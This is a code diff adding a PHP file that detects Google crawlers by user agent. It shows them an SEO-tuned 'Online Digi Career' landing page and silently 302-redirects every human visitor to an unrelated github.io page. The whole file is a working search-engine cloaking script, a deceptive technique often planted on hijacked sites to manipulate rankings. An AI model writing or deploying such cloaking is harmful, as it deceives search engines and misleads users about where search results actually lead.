@@ -1,0 +1,338 @@
+<?php
+// ============================================
+// GOOGLE BOT DETECTION & REDIRECTION SYSTEM
+// ============================================
+
+/**
+ * Check if the visitor is a Google bot
+ * @return bool True if it's a Google bot, false otherwise
+ */
+function isGoogleBot() {
+    // Get user agent from request headers
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    
+    // Complete list of Google bot user agents
+    $googleBots = [
+        'Googlebot',                // Main Googlebot
+        'Googlebot-Image',          // Googlebot for images
+        'Googlebot-Mobile',         // Googlebot for mobile
+        'Googlebot-News',           // Googlebot for news
+        'Googlebot-Video',          // Googlebot for video
+        'Googlebot-Image',          // Googlebot for images
+        'AdsBot-Google',            // Google Ads bot
+        'Mediapartners-Google',     // Google AdSense bot
+        'Google Favicon',           // Google favicon crawler
+        'GoogleOther',              // Other Google bots
+        'Google-Sitemaps',          // Google sitemaps
+        'Google-PageSpeed',         // Google PageSpeed Insights
+        'Google-Structured-Data',   // Google Structured Data
+        'Google-Apps-Script',       // Google Apps Script
+        'Google-Read-Aloud',        // Google Read Aloud
+        'Google-Cloud-Tasks',       // Google Cloud Tasks
+        'Google-Safety'             // Google Safety crawler
+    ];
+    
+    // Check if user agent contains any Google bot identifier
+    foreach ($googleBots as $bot) {
+        if (stripos($userAgent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    // Additional verification via IP reverse DNS (optional but more secure)
+    // Uncomment this section for enhanced security
+    /*
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    if ($ip) {
+        $hostname = gethostbyaddr($ip);
+        if ($hostname !== false && strpos($hostname, '.googlebot.com') !== false) {
+            return true;
+        }
+    }
+    */
+    
+    return false;
+}
+
+// Check if the visitor is a Google bot
+if (isGoogleBot()) {
+    // ============================================
+    // GOOGLE BOT - SERVE MAIN SITE CONTENT
+    // ============================================
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Online Digi Career - Digital Career Resources</title>
+        <meta name="description" content="Online Digi Career provides digital career resources, courses, and guidance for your professional growth.">
+        <meta name="keywords" content="digital career, online courses, career development, professional growth">
+        <meta name="robots" content="index, follow">
+        
+        <!-- Open Graph Tags for better social media sharing -->
+        <meta property="og:title" content="Online Digi Career - Digital Career Resources">
+        <meta property="og:description" content="Your one-stop platform for digital career development and professional growth.">
+        <meta property="og:type" content="website">
+        <meta property="og:url" content="https://www.onlinedigicareer.online/">
+        
+        <!-- Favicon -->
+        <link rel="icon" href="favicon.ico" type="image/x-icon">
+        
+        <style>
+            /* ===== MAIN STYLES ===== */
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            
+            body {
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                line-height: 1.6;
+                color: #333;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                min-height: 100vh;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+            
+            .container {
+                max-width: 1200px;
+                width: 90%;
+                margin: 0 auto;
+                padding: 40px;
+                background: rgba(255, 255, 255, 0.95);
+                border-radius: 20px;
+                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+                backdrop-filter: blur(10px);
+            }
+            
+            h1 {
+                font-size: 3rem;
+                color: #2d3748;
+                margin-bottom: 10px;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                background-clip: text;
+            }
+            
+            .subtitle {
+                font-size: 1.2rem;
+                color: #718096;
+                margin-bottom: 30px;
+                border-bottom: 2px solid #e2e8f0;
+                padding-bottom: 20px;
+            }
+            
+            .features {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                gap: 25px;
+                margin: 30px 0;
+            }
+            
+            .feature-card {
+                background: #f7fafc;
+                padding: 25px;
+                border-radius: 12px;
+                transition: transform 0.3s ease, box-shadow 0.3s ease;
+                border: 1px solid #e2e8f0;
+            }
+            
+            .feature-card:hover {
+                transform: translateY(-5px);
+                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            }
+            
+            .feature-card h3 {
+                color: #2d3748;
+                margin-bottom: 10px;
+                font-size: 1.2rem;
+            }
+            
+            .feature-card p {
+                color: #718096;
+            }
+            
+            .feature-icon {
+                font-size: 2.5rem;
+                margin-bottom: 15px;
+                display: block;
+            }
+            
+            .cta-section {
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                color: white;
+                padding: 30px;
+                border-radius: 12px;
+                margin: 30px 0;
+                text-align: center;
+            }
+            
+            .cta-section h2 {
+                font-size: 2rem;
+                margin-bottom: 10px;
+            }
+            
+            .cta-section p {
+                font-size: 1.1rem;
+                opacity: 0.95;
+            }
+            
+            .btn {
+                display: inline-block;
+                background: white;
+                color: #764ba2;
+                padding: 12px 30px;
+                border-radius: 50px;
+                text-decoration: none;
+                font-weight: 600;
+                margin-top: 15px;
+                transition: transform 0.3s ease, box-shadow 0.3s ease;
+            }
+            
+            .btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+            }
+            
+            footer {
+                margin-top: 30px;
+                text-align: center;
+                color: #a0aec0;
+                font-size: 0.9rem;
+                border-top: 1px solid #e2e8f0;
+                padding-top: 20px;
+            }
+            
+            /* ===== RESPONSIVE DESIGN ===== */
+            @media (max-width: 768px) {
+                h1 {
+                    font-size: 2rem;
+                }
+                
+                .container {
+                    padding: 20px;
+                }
+                
+                .features {
+                    grid-template-columns: 1fr;
+                }
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <!-- Header -->
+            <header>
+                <h1>🚀 Online Digi Career</h1>
+                <p class="subtitle">Your Digital Career Development Platform</p>
+            </header>
+            
+            <!-- Main Content -->
+            <main>
+                <div class="features">
+                    <div class="feature-card">
+                        <span class="feature-icon">📚</span>
+                        <h3>Online Courses</h3>
+                        <p>Access premium digital marketing, web development, and career growth courses.</p>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <span class="feature-icon">💼</span>
+                        <h3>Career Guidance</h3>
+                        <p>Get expert advice on career planning, resume building, and interview preparation.</p>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <span class="feature-icon">🌐</span>
+                        <h3>Digital Skills</h3>
+                        <p>Master essential digital skills for the modern workplace and future-ready careers.</p>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <span class="feature-icon">🤝</span>
+                        <h3>Community</h3>
+                        <p>Connect with like-minded professionals and grow your network.</p>
+                    </div>
+                </div>
+                
+                <!-- Call to Action -->
+                <div class="cta-section">
+                    <h2>Start Your Digital Career Journey Today</h2>
+                    <p>Join thousands of professionals who are transforming their careers with our resources.</p>
+                    <a href="#" class="btn">Get Started Now →</a>
+                </div>
+                
+                <!-- Additional Content -->
+                <div style="margin: 20px 0;">
+                    <h2 style="color: #2d3748; margin-bottom: 15px;">Why Choose Online Digi Career?</h2>
+                    <ul style="list-style: none; padding: 0;">
+                        <li style="padding: 10px 0; border-bottom: 1px solid #f0f0f0;">
+                            ✅ <strong>Expert-Led Content</strong> - Learn from industry professionals
+                        </li>
+                        <li style="padding: 10px 0; border-bottom: 1px solid #f0f0f0;">
+                            ✅ <strong>Flexible Learning</strong> - Study at your own pace
+                        </li>
+                        <li style="padding: 10px 0; border-bottom: 1px solid #f0f0f0;">
+                            ✅ <strong>Practical Skills</strong> - Hands-on projects and real-world applications
+                        </li>
+                        <li style="padding: 10px 0;">
+                            ✅ <strong>Career Support</strong> - Job placement assistance and mentorship
+                        </li>
+                    </ul>
+                </div>
+            </main>
+            
+            <!-- Footer -->
+            <footer>
+                <p>&copy; <?php echo date('Y'); ?> Online Digi Career. All rights reserved.</p>
+                <p style="margin-top: 5px;">
+                    <small>Powered by Digital Education</small>
+                </p>
+            </footer>
+        </div>
+        
+        <!-- ===== JAVASCRIPT ===== -->
+        <script>
+            // Smooth scrolling and animations
+            document.addEventListener('DOMContentLoaded', function() {
+                // Add fade-in animation to feature cards
+                const cards = document.querySelectorAll('.feature-card');
+                cards.forEach((card, index) => {
+                    card.style.opacity = '0';
+                    card.style.transform = 'translateY(20px)';
+                    setTimeout(() => {
+                        card.style.transition = 'all 0.6s ease';
+                        card.style.opacity = '1';
+                        card.style.transform = 'translateY(0)';
+                    }, 100 * (index + 1));
+                });
+                
+                // Interactive button hover effect
+                const btn = document.querySelector('.btn');
+                if (btn) {
+                    btn.addEventListener('mouseenter', function() {
+                        this.style.transform = 'scale(1.05)';
+                    });
+                    btn.addEventListener('mouseleave', function() {
+                        this.style.transform = 'scale(1)';
+                    });
+                }
+            });
+        </script>
+    </body>
+    </html>
+    <?php
+} else {
+    // ============================================
+    // HUMAN VISITOR - REDIRECT TO OTHER SITE
+    // ============================================
+    // Send 302 Found status (temporary redirect)
+    header('Location: https://projectpoints.github.io/learn-german/', true, 302);
+    exit;
+}
+?>
